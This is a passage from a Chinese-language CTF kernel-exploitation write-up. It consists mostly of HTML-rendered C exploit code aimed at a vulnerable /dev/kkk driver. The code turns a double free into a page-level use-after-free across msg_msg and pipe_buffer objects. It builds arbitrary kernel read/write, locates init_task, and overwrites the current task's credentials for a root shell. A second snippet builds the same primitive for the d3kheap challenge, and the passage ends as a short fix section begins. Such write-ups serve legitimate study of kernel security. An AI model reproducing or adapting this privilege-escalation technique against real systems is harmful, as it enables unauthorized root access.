class="hljs-keyword">struct</span> pipe_buffer *);<br>&#125;;<br><br><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">list_head</span> &#123;</span><br>    <span class="hljs-type">uint64_t</span>    next;<br>    <span class="hljs-type">uint64_t</span>    prev;<br>&#125;;<br><br><span class="hljs-meta">#<span class="hljs-keyword">ifndef</span> MSG_COPY</span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> MSG_COPY 040000</span><br><span class="hljs-meta">#<span class="hljs-keyword">endif</span></span><br><br><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">msg_msg</span> &#123;</span><br>    <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">list_head</span> <span class="hljs-title">m_list</span>;</span><br>    <span class="hljs-type">uint64_t</span>    m_type;<br>    <span class="hljs-type">uint64_t</span>    m_ts;<br>    <span class="hljs-type">uint64_t</span>    next;<br>    <span class="hljs-type">uint64_t</span>    security;<br>&#125;;<br><br><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">msg_msgseg</span> &#123;</span><br>    <span class="hljs-type">uint64_t</span>    next;<br>&#125;;<br><br><span class="hljs-comment">/*</span><br><span class="hljs-comment">struct msgbuf &#123;</span><br><span class="hljs-comment">    long mtype;</span><br><span class="hljs-comment">    char mtext[0];</span><br><span class="hljs-comment">&#125;;</span><br><span class="hljs-comment">*/</span><br><br><span class="hljs-type">int</span> <span class="hljs-title function_">get_msg_queue</span><span class="hljs-params">(<span class="hljs-type">void</span>)</span><br>&#123;<br>    <span class="hljs-keyword">return</span> msgget(IPC_PRIVATE, <span class="hljs-number">0666</span> | IPC_CREAT);<br>&#125;<br><br><span class="hljs-type">int</span> <span class="hljs-title function_">read_msg</span><span class="hljs-params">(<span class="hljs-type">int</span> msqid, <span class="hljs-type">void</span> *msgp, <span class="hljs-type">size_t</span> msgsz, <span class="hljs-type">long</span> msgtyp)</span><br>&#123;<br>    <span class="hljs-keyword">return</span> msgrcv(msqid, msgp, msgsz, msgtyp, <span class="hljs-number">0</span>);<br>&#125;<br><br><span class="hljs-comment">/**</span><br><span class="hljs-comment"> * the msgp should be a pointer to the `struct msgbuf`,</span><br><span class="hljs-comment"> * and the data should be stored in msgbuf.mtext</span><br><span class="hljs-comment"> */</span><br><span class="hljs-type">int</span> <span class="hljs-title function_">write_msg</span><span class="hljs-params">(<span class="hljs-type">int</span> msqid, <span class="hljs-type">void</span> *msgp, <span class="hljs-type">size_t</span> msgsz, <span class="hljs-type">long</span> msgtyp)</span><br>&#123;<br>    ((<span class="hljs-keyword">struct</span> msgbuf*)msgp)-&gt;mtype = msgtyp;<br>    <span class="hljs-keyword">return</span> msgsnd(msqid, msgp, msgsz, <span class="hljs-number">0</span>);<br>&#125;<br><br><span class="hljs-meta">#<span class="hljs-keyword">ifndef</span> MSG_COPY</span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> MSG_COPY        040000  <span class="hljs-comment">/* copy (not remove) all queue messages */</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">endif</span></span><br><br><span class="hljs-comment">/* for MSG_COPY, `msgtyp` means to read no.msgtyp msg_msg on the queue */</span><br><span class="hljs-type">int</span> <span class="hljs-title function_">peek_msg</span><span class="hljs-params">(<span class="hljs-type">int</span> msqid, <span class="hljs-type">void</span> *msgp, <span class="hljs-type">size_t</span> msgsz, <span class="hljs-type">long</span> msgtyp)</span><br>&#123;<br>    <span class="hljs-keyword">return</span> msgrcv(msqid, msgp, msgsz, msgtyp, <br>                  MSG_COPY | IPC_NOWAIT | MSG_NOERROR);<br>&#125;<br><br><span class="hljs-type">void</span> <span class="hljs-title function_">build_msg</span><span class="hljs-params">(<span class="hljs-keyword">struct</span> msg_msg *msg, <span class="hljs-type">uint64_t</span> m_list_next, <span class="hljs-type">uint64_t</span> m_list_prev, </span><br><span class="hljs-params">              <span class="hljs-type">uint64_t</span> m_type, <span class="hljs-type">uint64_t</span> m_ts,  <span class="hljs-type">uint64_t</span> next, <span class="hljs-type">uint64_t</span> security)</span><br>&#123;<br>    msg-&gt;m_list.next = m_list_next;<br>    msg-&gt;m_list.prev = m_list_prev;<br>    msg-&gt;m_type = m_type;<br>    msg-&gt;m_ts = m_ts;<br>    msg-&gt;next = next;<br>    msg-&gt;security = security;<br>&#125;<br><br><span class="hljs-comment">/**</span><br><span class="hljs-comment"> * II - interface to interact with /dev/kcache</span><br><span class="hljs-comment"> */</span><br><br><span class="hljs-type">int</span> dev_fd;<br><br><span class="hljs-comment">/* msg type */</span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> TYPE_REQUEST    1</span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> TYPE_REPLY      2</span><br><br><span class="hljs-comment">/* user to kernel request */</span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> CMD_ENCRYPT_TEA     1</span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> CMD_DECRYPT_TEA     2</span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> CMD_HASH_MD5        3</span><br><br><span class="hljs-comment">/* msg status */</span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> STATUS_SUCCESS      1</span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> STATUS_FAIL         2</span><br><br><span class="hljs-comment">/* for ioctl */</span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> RECV_MSG 0x114514</span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> SEND_MSG 0x1919810</span><br><br><span class="hljs-comment">/* message header */</span><br><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">msg_hdr</span> &#123;</span><br>    <span class="hljs-type">uint16_t</span> type;<br>    <span class="hljs-type">uint16_t</span> cmd;<br>    <span class="hljs-type">uint16_t</span> status;    <span class="hljs-comment">/* for TYPE_REPLY only */</span><br>    <span class="hljs-type">size_t</span>  tag;        <span class="hljs-comment">/* for user to identify different message */</span><br>    <span class="hljs-type">size_t</span> data_len;<br>    <span class="hljs-type">char</span> data[<span class="hljs-number">0</span>];<br>&#125;;<br><br><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">tea_crypt_info</span> &#123;</span><br>    <span class="hljs-type">uint32_t</span> key[<span class="hljs-number">4</span>];<br>    <span class="hljs-type">char</span> text[<span class="hljs-number">0</span>];<br>&#125;;<br><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> set_msg_hdr(_hdr, _type, _cmd, _status, _tag, _data_len)        \</span><br><span class="hljs-meta">    do &#123;                                                        \</span><br><span class="hljs-meta">        _hdr-&gt;type = _type;                                     \</span><br><span class="hljs-meta">        _hdr-&gt;cmd = _cmd;                                       \</span><br><span class="hljs-meta">        _hdr-&gt;status = _status;                                 \</span><br><span class="hljs-meta">        _hdr-&gt;tag = _tag;                                       \</span><br><span class="hljs-meta">        _hdr-&gt;data_len = _data_len;                             \</span><br><span class="hljs-meta">    &#125; while (0)</span><br><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> get_hdr_data(__hdr, ptr_type) (&#123;                        \</span><br><span class="hljs-meta">    ((ptr_type*) &amp;__hdr-&gt;data);                                 \</span><br><span class="hljs-meta">&#125;)</span><br><br><span class="hljs-type">long</span> <span class="hljs-title function_">kkk_send_msg</span><span class="hljs-params">(<span class="hljs-type">int</span> dev_fd, <span class="hljs-keyword">struct</span> msg_hdr *msg)</span><br>&#123;<br>    <span class="hljs-keyword">return</span> ioctl(dev_fd, SEND_MSG, msg);<br>&#125;<br><br><span class="hljs-type">long</span> <span class="hljs-title function_">kkk_recv_msg</span><span class="hljs-params">(<span class="hljs-type">int</span> dev_fd, <span class="hljs-keyword">struct</span> msg_hdr *msg)</span><br>&#123;<br>    <span class="hljs-keyword">return</span> ioctl(dev_fd, RECV_MSG, msg);<br>&#125;<br><br><span class="hljs-comment">/**</span><br><span class="hljs-comment"> *  III - FIRST exploit stage - make page-level UAF</span><br><span class="hljs-comment">*/</span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> SECOND_LEVEL_PIPE_NUM 0x100</span><br><br><span class="hljs-type">int</span> rw_pipe[<span class="hljs-number">2</span>];<br><span class="hljs-type">int</span> second_level_pipe[SECOND_LEVEL_PIPE_NUM][<span class="hljs-number">2</span>];<br><span class="hljs-type">int</span> msqid;<br><span class="hljs-type">size_t</span> msg_buf[<span class="hljs-number">0x1000</span>], *pipe_buf, pipe_ops;<br><br><span class="hljs-type">void</span> <span class="hljs-title function_">construct_uaf_on_msg_and_pipe</span><span class="hljs-params">(<span class="hljs-type">void</span>)</span><br>&#123;<br>    <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">msg_hdr</span> *<span class="hljs-title">msg</span>;</span><br>    <span class="hljs-type">size_t</span> checksum;<br>    <span class="hljs-type">int</span> ret;<br>    <span class="hljs-type">char</span> *buf;<br><br>    msqid = get_msg_queue();<br><br>    msg = <span class="hljs-built_in">malloc</span>(<span class="hljs-number">0x200</span>);<br>    <span class="hljs-built_in">memset</span>(msg, <span class="hljs-string">&#x27;A&#x27;</span>, <span class="hljs-keyword">sizeof</span>(*msg));<br>    set_msg_hdr(msg, TYPE_REQUEST, CMD_ENCRYPT_TEA, <span class="hljs-number">0</span>, <span class="hljs-number">0</span>, <span class="hljs-number">160</span> - <span class="hljs-keyword">sizeof</span>(*msg));<br><br>    <span class="hljs-comment">/* prepare the pipes in advance */</span><br>    pipe(rw_pipe);<br><br>    <span class="hljs-comment">/**</span><br><span class="hljs-comment">     * trigger double free to make pipe_buffer and msg_seg the same object.</span><br><span class="hljs-comment">     * note that we should write and read the pipe in advance, so that it won&#x27;t</span><br><span class="hljs-comment">     * use the pipe_buffer[0], which will lead to an invalid msg_seg</span><br><span class="hljs-comment">     */</span><br>    kkk_send_msg(dev_fd, msg);<br>    sleep(<span class="hljs-number">2</span>);<br>    <span class="hljs-keyword">if</span> (kkk_recv_msg(dev_fd, (<span class="hljs-keyword">struct</span> msg_hdr *) <span class="hljs-number">0xbeefedead0</span>) &lt; <span class="hljs-number">0</span>) &#123;<br>        <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;[=] errno: %d\n&quot;</span>, errno);<br>    &#125;<br>    fcntl(rw_pipe[<span class="hljs-number">0</span>], F_SETPIPE_SZ, <span class="hljs-number">0x1000</span> * <span class="hljs-number">4</span>);<br>    write(rw_pipe[<span class="hljs-number">1</span>], <span class="hljs-string">&quot;arttnba3&quot;</span>, <span class="hljs-number">8</span>);<br>    read(rw_pipe[<span class="hljs-number">0</span>], &amp;checksum, <span class="hljs-number">8</span>);<br>    write(rw_pipe[<span class="hljs-number">1</span>], <span class="hljs-string">&quot;arttnba3&quot;</span>, <span class="hljs-number">8</span>);<br><br>    <span class="hljs-keyword">if</span> (kkk_recv_msg(dev_fd, (<span class="hljs-keyword">struct</span> msg_hdr *) <span class="hljs-number">0xdeadbeef0</span>) &lt; <span class="hljs-number">0</span>) &#123;<br>        <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;[=] errno: %d\n&quot;</span>, errno);<br>    &#125;<br>    write_msg(msqid, msg_buf, <span class="hljs-number">0x1000</span> + <span class="hljs-number">160</span> - <span class="hljs-keyword">sizeof</span>(<span class="hljs-keyword">struct</span> msg_msg) - <span class="hljs-number">8</span>, <span class="hljs-number">0x41</span>);<br><br>    write(rw_pipe[<span class="hljs-number">1</span>], <span class="hljs-string">&quot;arttnba3&quot;</span>, <span class="hljs-number">8</span>);<br><br>    peek_msg(msqid, msg_buf, <span class="hljs-number">0x1000</span> + <span class="hljs-number">160</span> - <span class="hljs-keyword">sizeof</span>(<span class="hljs-keyword">struct</span> msg_msg) - <span class="hljs-number">8</span>, <span class="hljs-number">0</span>);<br>    pipe_buf = (<span class="hljs-type">size_t</span>*) ((<span class="hljs-type">size_t</span>) msg_buf + <span class="hljs-number">0x1000</span> - <span class="hljs-keyword">sizeof</span>(<span class="hljs-keyword">struct</span> msg_msg));<br>    <span class="hljs-keyword">if</span> (pipe_buf[<span class="hljs-number">12</span>] &lt; <span class="hljs-number">0xffffffff81000000</span>) &#123;<br>        err_exit(<span class="hljs-string">&quot;FAILED to make UAF on pipe!&quot;</span>);<br>    &#125;<br>    pipe_ops = pipe_buf[<span class="hljs-number">12</span>];<br><br>    <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;\033[32m\033[1m[+] Successfully build UAF pipe_buffer!\033[0m&quot;</span>);<br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;\033[34m\033[1m[*] Page: \033[0m%lx &quot;</span>, pipe_buf[<span class="hljs-number">10</span>]);<br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;\033[34m\033[1m, ops: \033[0m%lx\n&quot;</span>, pipe_ops);<br>&#125;<br><br><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">pipe_buffer</span> *<span class="hljs-title">fake_buf</span>;</span><br><br><span class="hljs-type">void</span> <span class="hljs-title function_">arbitrary_read_by_pipe</span><span class="hljs-params">(<span class="hljs-type">size_t</span> page_addr, <span class="hljs-type">void</span> *buf)</span><br>&#123;<br>    fake_buf = (<span class="hljs-keyword">struct</span> pipe_buffer*) &amp;pipe_buf[<span class="hljs-number">5</span>];<br>    read_msg(msqid, msg_buf, <span class="hljs-number">0x1000</span> + <span class="hljs-number">160</span> - <span class="hljs-keyword">sizeof</span>(<span class="hljs-keyword">struct</span> msg_msg) - <span class="hljs-number">8</span>, <span class="hljs-number">0x41</span>);<br><br>    fake_buf-&gt;page = (<span class="hljs-keyword">struct</span> page*) page_addr;<br>    fake_buf-&gt;len = <span class="hljs-number">0x1ff8</span>;<br>    fake_buf-&gt;offset = <span class="hljs-number">0</span>;<br>    fake_buf-&gt;ops = (<span class="hljs-keyword">struct</span> pipe_buf_operations*) pipe_ops;<br><br>    write_msg(msqid, msg_buf, <span class="hljs-number">0x1000</span> + <span class="hljs-number">160</span> - <span class="hljs-keyword">sizeof</span>(<span class="hljs-keyword">struct</span> msg_msg) - <span class="hljs-number">8</span>, <span class="hljs-number">0x41</span>);<br><br>    read(rw_pipe[<span class="hljs-number">0</span>], buf, <span class="hljs-number">0xfff</span>);<br>&#125;<br><br><span class="hljs-type">void</span> <span class="hljs-title function_">arbitrary_write_by_pipe</span><span class="hljs-params">(<span class="hljs-type">size_t</span> page_addr, <span class="hljs-type">void</span> *buf, <span class="hljs-type">size_t</span> len)</span><br>&#123;<br>    fake_buf = (<span class="hljs-keyword">struct</span> pipe_buffer*) &amp;pipe_buf[<span class="hljs-number">10</span>];<br>    read_msg(msqid, msg_buf, <span class="hljs-number">0x1000</span> + <span class="hljs-number">160</span> - <span class="hljs-keyword">sizeof</span>(<span class="hljs-keyword">struct</span> msg_msg) - <span class="hljs-number">8</span>, <span class="hljs-number">0x41</span>);<br><br>    fake_buf-&gt;page = (<span class="hljs-keyword">struct</span> page*) page_addr;<br>    fake_buf-&gt;len = <span class="hljs-number">0</span>;<br>    fake_buf-&gt;offset = <span class="hljs-number">0</span>;<br>    fake_buf-&gt;ops = (<span class="hljs-keyword">struct</span> pipe_buf_operations*) pipe_ops;<br><br>    write_msg(msqid, msg_buf, <span class="hljs-number">0x1000</span> + <span class="hljs-number">160</span> - <span class="hljs-keyword">sizeof</span>(<span class="hljs-keyword">struct</span> msg_msg) - <span class="hljs-number">8</span>, <span class="hljs-number">0x41</span>);<br><br>    len = len &gt; <span class="hljs-number">0xffe</span> ? <span class="hljs-number">0xffe</span> : len;<br><br>    write(rw_pipe[<span class="hljs-number">1</span>], buf, len);<br>&#125;<br><br><span class="hljs-type">size_t</span> data_buf[<span class="hljs-number">0x1000</span>], *tsk_buf, current_task_page, current_task, parent_task;<br><br><span class="hljs-type">void</span> <span class="hljs-title function_">seek_current_task_struct</span><span class="hljs-params">(<span class="hljs-type">void</span>)</span><br>&#123;<br>    <span class="hljs-type">size_t</span>  *comm_addr;<br><br>    vmemmap_base = pipe_buf[<span class="hljs-number">10</span>] &amp; <span class="hljs-number">0xfffffffff0000000</span>;<br><br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;\033[32m\033[1m[+] vmemmap_base:\033[0m 0x%lx\n\n&quot;</span>, vmemmap_base);<br><br>    <span class="hljs-comment">/* now seeking for the task_struct in kernel memory */</span><br>    <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;[*] Seeking task_struct in memory...&quot;</span>);<br><br>    prctl(PR_SET_NAME, <span class="hljs-string">&quot;arttnba3pwnn&quot;</span>);<br><br>    <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> i = <span class="hljs-number">0</span>; <span class="hljs-number">1</span>; i++) &#123;<br>        arbitrary_read_by_pipe(vmemmap_base + i * <span class="hljs-number">0x40</span>, data_buf);<br>    <br>        comm_addr = memmem(data_buf, <span class="hljs-number">0xf00</span>, <span class="hljs-string">&quot;arttnba3pwnn&quot;</span>, <span class="hljs-number">12</span>);<br>        <span class="hljs-keyword">if</span> (comm_addr &amp;&amp; (comm_addr[<span class="hljs-number">-2</span>] &gt; <span class="hljs-number">0xffff888000000000</span>) <span class="hljs-comment">/* task-&gt;cred */</span><br>            &amp;&amp; (comm_addr[<span class="hljs-number">-3</span>] &gt; <span class="hljs-number">0xffff888000000000</span>) <span class="hljs-comment">/* task-&gt;real_cred */</span><br>            &amp;&amp; (comm_addr[<span class="hljs-number">-61</span>] &gt; <span class="hljs-number">0xffff888000000000</span>) <span class="hljs-comment">/* task-&gt;read_parent */</span><br>            &amp;&amp; (comm_addr[<span class="hljs-number">-60</span>] &gt; <span class="hljs-number">0xffff888000000000</span>)) &#123;  <span class="hljs-comment">/* task-&gt;parent */</span><br><br>            <span class="hljs-comment">/* task-&gt;read_parent */</span><br>            parent_task = comm_addr[<span class="hljs-number">-61</span>];<br><br>            <span class="hljs-comment">/* task_struct::ptraced */</span><br>            current_task = comm_addr[<span class="hljs-number">-54</span>] - <span class="hljs-number">2528</span>;<br><br>            page_offset_base = (comm_addr[<span class="hljs-number">-54</span>]&amp;<span class="hljs-number">0xfffffffffffff000</span>) - i * <span class="hljs-number">0x1000</span>;<br>            page_offset_base &amp;= <span class="hljs-number">0xfffffffff0000000</span>;<br><br>            <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;\033[32m\033[1m[+] Found task_struct on page: \033[0m%lx\n&quot;</span>,<br>                   (vmemmap_base + i * <span class="hljs-number">0x40</span>));<br>            <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;\033[32m\033[1m[+] page_offset_base: \033[0m0x%lx\n&quot;</span>,<br>                   page_offset_base);<br>            <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;\033[34m\033[1m[*] current task_struct&#x27;s addr: \033[0m&quot;</span><br>                   <span class="hljs-string">&quot;0x%lx\n\n&quot;</span>, current_task);<br>            <span class="hljs-keyword">break</span>;<br>        &#125;<br>    &#125;<br>&#125;<br><br><span class="hljs-type">void</span> <span class="hljs-title function_">privilege_escalation_by_task_overwrite</span><span class="hljs-params">(<span class="hljs-type">void</span>)</span><br>&#123;<br>    <span class="hljs-comment">/* finding the init_task, the final parent of every task */</span><br>    <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;[*] Seeking for init_task...&quot;</span>);<br><br>    <span class="hljs-keyword">for</span> (;;) &#123;<br>        <span class="hljs-type">size_t</span> ptask_page_addr = direct_map_addr_to_page_addr(parent_task);<br><br>        tsk_buf = (<span class="hljs-type">size_t</span>*) ((<span class="hljs-type">size_t</span>) data_buf + (parent_task &amp; <span class="hljs-number">0xfff</span>));<br><br>        arbitrary_read_by_pipe(ptask_page_addr, data_buf);<br>        arbitrary_read_by_pipe(ptask_page_addr+<span class="hljs-number">0x40</span>, &amp;data_buf[<span class="hljs-number">512</span>]);<br><br>        <span class="hljs-comment">/* task_struct::real_parent */</span><br>        <span class="hljs-keyword">if</span> (parent_task == tsk_buf[<span class="hljs-number">309</span>]) &#123;<br>            <span class="hljs-keyword">break</span>;<br>        &#125;<br><br>        parent_task = tsk_buf[<span class="hljs-number">309</span>];<br>    &#125;<br><br>    init_task = parent_task;<br>    init_cred = tsk_buf[<span class="hljs-number">367</span>];<br>    init_nsproxy = tsk_buf[<span class="hljs-number">381</span>];<br><br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;\033[32m\033[1m[+] Found init_task: \033[0m0x%lx\n&quot;</span>, init_task);<br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;\033[32m\033[1m[+] Found init_cred: \033[0m0x%lx\n&quot;</span>, init_cred);<br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;\033[32m\033[1m[+] Found init_nsproxy:\033[0m0x%lx\n&quot;</span>,init_nsproxy);<br><br>    <span class="hljs-comment">/* now, changing the current task_struct to get the full root :) */</span><br>    <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;[*] Escalating ROOT privilege now...&quot;</span>);<br><br>    current_task_page = direct_map_addr_to_page_addr(current_task);<br><br>    arbitrary_read_by_pipe(current_task_page, data_buf);<br>    arbitrary_read_by_pipe(current_task_page + <span class="hljs-number">0x40</span>, &amp;data_buf[<span class="hljs-number">512</span>]);<br><br>    tsk_buf = (<span class="hljs-type">size_t</span>*) ((<span class="hljs-type">size_t</span>) data_buf + (current_task &amp; <span class="hljs-number">0xfff</span>));<br>    tsk_buf[<span class="hljs-number">367</span>] = init_cred;<br>    tsk_buf[<span class="hljs-number">368</span>] = init_cred;<br>    tsk_buf[<span class="hljs-number">381</span>] = init_nsproxy;<br><br>    arbitrary_write_by_pipe(current_task_page, data_buf, <span class="hljs-number">0xff0</span>);<br>    arbitrary_write_by_pipe(current_task_page + <span class="hljs-number">0x40</span>, &amp;data_buf[<span class="hljs-number">512</span>], <span class="hljs-number">0xff0</span>);<br><br>    <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;[+] Done.\n&quot;</span>);<br>&#125;<br><br><span class="hljs-type">int</span> <span class="hljs-title function_">main</span><span class="hljs-params">(<span class="hljs-type">int</span> argc, <span class="hljs-type">char</span> **argv, <span class="hljs-type">char</span> **envp)</span><br>&#123;<br>    save_status();<br>    bind_core(<span class="hljs-number">0</span>);<br><br>    dev_fd = open(<span class="hljs-string">&quot;/dev/kkk&quot;</span>, O_RDWR);<br>    <span class="hljs-keyword">if</span> (dev_fd &lt; <span class="hljs-number">0</span>) &#123;<br>        err_exit(<span class="hljs-string">&quot;FAILED to open /dev/kkk!&quot;</span>);<br>    &#125;<br><br>    construct_uaf_on_msg_and_pipe();<br>    seek_current_task_struct();<br>    privilege_escalation_by_task_overwrite();<br>    get_root_shell();<br><br>    <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br><br></code></pre></td></tr></table></figure><p>运行即可完成提权：</p><p><img src="https://s2.loli.net/2023/07/13/sr65qaWAN9lE4Cy.png" alt="image.png"></p><blockquote><p><del>笔者也不记得该编译选项是否默认开启了</del>，若未开启该编译选项，则仍可以直接构造 page-level UAF，以笔者去年出的题目 <code>d3kheap</code> 为例，可以通过如下方式完成 page UAF 的构造，细节参见注释：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-meta">#<span class="hljs-keyword">define</span> SECOND_LEVEL_PIPE_NUM 0x100</span><br><br><span class="hljs-type">int</span> victim_pipe[<span class="hljs-number">2</span>], vuln_pipe[<span class="hljs-number">2</span>], holder_pipe[<span class="hljs-number">2</span>];<br><span class="hljs-type">int</span> second_level_pipe[SECOND_LEVEL_PIPE_NUM][<span class="hljs-number">2</span>];<br><span class="hljs-type">size_t</span> pipe_buf[<span class="hljs-number">0x1000</span>];<br><br><span class="hljs-type">void</span> <span class="hljs-title function_">construct_page_uaf_with_pipe</span><span class="hljs-params">(<span class="hljs-type">void</span>)</span><br>&#123;<br>    <span class="hljs-type">size_t</span> checksum;<br><br>    <span class="hljs-built_in">memset</span>(pipe_buf, <span class="hljs-string">&#x27;A&#x27;</span>, <span class="hljs-keyword">sizeof</span>(pipe_buf));<br>    <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> i = <span class="hljs-number">0</span>; i &lt; SECOND_LEVEL_PIPE_NUM; i++) &#123;<br>        pipe(second_level_pipe[i]);<br>    &#125;<br><br>    <span class="hljs-comment">/* make two pipes point to the same buffer */</span><br>    add();<br>    del();<br>    pipe(victim_pipe);<br>    <br>    del();<br>    pipe(vuln_pipe);<br><br>    <span class="hljs-comment">/* init pipe-&gt;head and pipe-&gt;tail, allocate page on buffer */</span><br>    write(victim_pipe[<span class="hljs-number">1</span>], <span class="hljs-string">&quot;rat3bant&quot;</span>, <span class="hljs-number">8</span>);<br>    write(vuln_pipe[<span class="hljs-number">1</span>], <span class="hljs-string">&quot;arttnba3&quot;</span>, <span class="hljs-number">8</span>);<br><br>    <span class="hljs-comment">/* migrate to another buffer, now we have two bufs point on the same page */</span><br>    fcntl(vuln_pipe[<span class="hljs-number">0</span>], F_SETPIPE_SZ, <span class="hljs-number">0x1000</span> * <span class="hljs-number">4</span>);<br>    write(vuln_pipe[<span class="hljs-number">1</span>], pipe_buf, <span class="hljs-number">0x800</span>); <span class="hljs-comment">/* pre-write for later read */</span><br><br>    read(vuln_pipe[<span class="hljs-number">0</span>], &amp;checksum, <span class="hljs-number">8</span>);<br>    <span class="hljs-keyword">if</span> (checksum != *(<span class="hljs-type">size_t</span>*) <span class="hljs-string">&quot;arttnba3&quot;</span>) &#123;<br>        <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;[x] Get checksum: %lx\n&quot;</span>, checksum);<br>        err_exit(<span class="hljs-string">&quot;two pipe didn&#x27;t share the same page!&quot;</span>);<br>    &#125;<br><br>    <span class="hljs-comment">/* now the page is reclaimed to pipe-&gt;tmp_page */</span><br>    read(victim_pipe[<span class="hljs-number">0</span>], &amp;checksum, <span class="hljs-number">8</span>);<br>    <span class="hljs-keyword">if</span> (checksum != *(<span class="hljs-type">size_t</span>*) <span class="hljs-string">&quot;arttnba3&quot;</span>) &#123;<br>        <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;[x] Get checksum: %lx\n&quot;</span>, checksum);<br>        err_exit(<span class="hljs-string">&quot;Pipe is corrupted!&quot;</span>);<br>    &#125;<br><br>    <span class="hljs-comment">/* avoid double free dtection */</span><br>    pipe(holder_pipe);<br><br>    <span class="hljs-comment">/* free pipe-&gt;tmp_page */</span><br>    close(victim_pipe[<span class="hljs-number">1</span>]);<br>    close(victim_pipe[<span class="hljs-number">0</span>]);<br><br>    <span class="hljs-comment">/* allocate UAF page as slub page */</span><br>    <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> i = <span class="hljs-number">0</span>; i &lt; SECOND_LEVEL_PIPE_NUM; i++) &#123;<br>        fcntl(second_level_pipe[i][<span class="hljs-number">0</span>], F_SETPIPE_SZ, <span class="hljs-number">0x1000</span> * <span class="hljs-number">2</span>);<br>    &#125;<br><br>    <span class="hljs-comment">/* init pipe bufs on UAF page */</span><br>    <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> i = <span class="hljs-number">0</span>; i &lt; SECOND_LEVEL_PIPE_NUM; i++) &#123;<br>        write(second_level_pipe[i][<span class="hljs-number">1</span>], <span class="hljs-string">&quot;arttnba3&quot;</span>, <span class="hljs-number">8</span>);<br>    &#125;<br><br>    <span class="hljs-comment">/* enjoy page-level UAF now :) */</span><br>    read(vuln_pipe[<span class="hljs-number">0</span>], pipe_buf, <span class="hljs-number">0x700</span>);<br><br>    <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> i = <span class="hljs-number">0</span>; i &lt; (<span class="hljs-number">0x700</span> / <span class="hljs-number">8</span>); i++) &#123;<br>        <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;[----data dump----][%d] %lx\n&quot;</span>, i, pipe_buf[i]);<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure></blockquote><h2 id="漏洞修复-1"><a href="#漏洞修复-1" class="headerlink" title="漏洞修复"></a>漏洞修复</h2><p>漏洞修复其实比较简单，只需要把读取失败的基本块的跳转目标改到 <code>kfree()</code> 之后即可：</p><p><img 